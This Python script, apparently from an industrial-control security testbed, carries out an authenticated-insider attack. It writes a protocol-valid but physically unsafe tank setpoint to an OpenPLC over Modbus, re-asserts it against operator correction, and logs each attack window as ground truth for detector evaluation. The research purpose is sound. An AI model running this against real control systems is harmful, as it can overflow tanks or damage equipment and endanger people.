#!/usr/bin/env python3
"""
insider_write.py  --  the AUTHENTICATED INSIDER attack (protocol-valid, harmful).

The insider issues a perfectly valid Modbus write to the tank setpoint register
(HR10) -- correct function code, correct register, well-formed request -- but the
value drives the process OUTSIDE its safe envelope (e.g. setpoint 1500 -> tank
overflows past the 900 mm high-level trip toward the 1200 mm brim). On the
network this is indistinguishable from a legitimate operator setpoint change
(see operator_setpoint.py); nothing in the packet stream marks it as malicious.
Only the physical-process-residual channel can catch it.

It writes ONE (or a few) valid setpoint(s) and holds, then optionally restores a
safe value, so the network footprint is minimal -- the opposite of a noisy flood.
Each attack window is appended to insider_ledger.csv as ground truth (by TIME),
so we can later measure: network detector = miss, residual detector = catch.

Usage (inside a container, e.g. a dedicated insider host):
    python3 insider_write.py [host] [port] [harmful_setpoint] [hold_s] [restore] [reassert_s]
    defaults: openplc 502 1500 25 400 1.0
      harmful_setpoint : the malicious value written to HR10 (1500 => overflow;
                         use e.g. 20 to force a dangerous low-level / dry-run)
      hold_s           : seconds to hold the harmful setpoint before restoring
      restore          : safe value written at the end (<0 to leave it harmful)
      reassert_s       : re-write the harmful setpoint every this many seconds so a
                         legitimate operator control loop cannot correct it away
                         (a determined insider pins the process); still low-rate

Environment:
    IIOT_CAP_DIR   where insider_ledger.csv is written (default /out, else CWD)
    INSIDER_IP     value recorded as attacker_ip in the ledger (default: auto)
"""
import os, sys, time, socket, csv
from pymodbus.client import ModbusTcpClient

HOST     = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT     = int(sys.argv[2]) if len(sys.argv) > 2 else 502
HARMFUL   = int(sys.argv[3]) if len(sys.argv) > 3 else 1500
HOLD_S    = float(sys.argv[4]) if len(sys.argv) > 4 else 25.0
RESTORE   = int(sys.argv[5]) if len(sys.argv) > 5 else 400
REASSERT  = float(sys.argv[6]) if len(sys.argv) > 6 else 1.0
SETPOINT_REG = 10

CAP = os.environ.get("IIOT_CAP_DIR", "/out" if os.path.isdir("/out") else ".")
LEDGER = os.path.join(CAP, "insider_ledger.csv")
try:
    MYIP = os.environ.get("INSIDER_IP") or socket.gethostbyname(socket.gethostname())
except Exception:
    MYIP = os.environ.get("INSIDER_IP", "unknown")


def wr(c, addr, val):
    try:
        try:
            c.write_register(addr, val)
        except TypeError:
            c.write_register(addr, value=val)
    except Exception:
        pass   # writes may be DROPped once an IPS blocks this host -- keep trying quietly


def ledger(start_ts, end_ts, value):
    new = not os.path.exists(LEDGER)
    with open(LEDGER, "a", newline="") as f:
        w = csv.writer(f)
        if new:
            w.writerow(["start_ts", "end_ts", "attack", "params", "attacker_ip"])
        w.writerow([f"{start_ts:.3f}", f"{end_ts:.3f}", "insider",
                    f"setpoint={value}", MYIP])


c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    sys.exit(f"[!] insider could not connect to {HOST}:{PORT}")

start = time.time()
print(f"[*] INSIDER: writing valid but harmful setpoint HR{SETPOINT_REG} = {HARMFUL} "
      f"(from {MYIP}) -- protocol-valid, physically unsafe; re-asserting every {REASSERT}s")
# pin the process at the harmful setpoint for HOLD_S, re-writing periodically so a
# concurrent legitimate operator loop cannot correct it away.
while time.time() - start < HOLD_S:
    wr(c, SETPOINT_REG, HARMFUL)
    time.sleep(REASSERT)
end = time.time()

if RESTORE >= 0:
    print(f"[*] INSIDER: restoring setpoint to {RESTORE}")
    wr(c, SETPOINT_REG, RESTORE)
c.close()

ledger(start, end, HARMFUL)
print(f"[*] insider event logged to {LEDGER}  ({start:.3f} -> {end:.3f})")
